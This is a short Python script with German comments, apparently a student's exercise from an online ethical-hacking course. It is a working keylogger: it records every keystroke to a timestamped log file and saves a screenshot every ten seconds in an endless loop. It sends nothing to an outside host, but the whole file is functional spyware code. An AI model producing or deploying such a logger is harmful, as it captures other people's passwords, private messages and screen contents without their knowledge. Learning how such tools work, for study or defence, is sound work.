# Alternative zu 75.1 nach https://www.udemy.com/course/ethical-hacking-mit-python/learn/lecture/8784360#overview
import keyboard
import datetime
import pyautogui
import time
import os
import json

keyboard.unhook_all() # Letzten Hook beenden

current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
filename = f"./{current_time}_log.txt"
file = open(filename, "w", encoding="utf-8")

############################################################################
# Funktionsdeklaration
############################################################################
def on_key(key):
    file.write(json.dumps(key.__dict__) + "\n") # __dict__ -> Objekteigenschaften ausgeben -> Gibt Informatioen aus z.B. über alle Funktionen die Aufrufbar sind
    file.flush()


def make_screenshot():
    time.sleep(10) # Warte 10 sec.
    current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    # print(current_time)
    filename = "./screenshots/" + current_time + ".jpg"
    #print(filename)
    pyautogui.screenshot(filename)

############################################################################
# Eigentlicher Code Startet hier
############################################################################
# Erstelle Ordner Screenshots wenn nicht vorhanden
if not os.path.exists("./screenshots"):
    os.mkdir("./screenshots")

while True: # Endlosschleife, über sleep wird jedoch ein Zeitblocker eingebaut, der den Prozessor entlastet
    keyboard.hook(on_key) # Hook starten zum aufnehmen aller kommenden Tastenanschläge
    # keyboard.wait(hotkey="esc") # Loop beenden mit bestimmter Taste
    # keyboard.wait() # Loop läuft ewig weiter
    make_screenshot()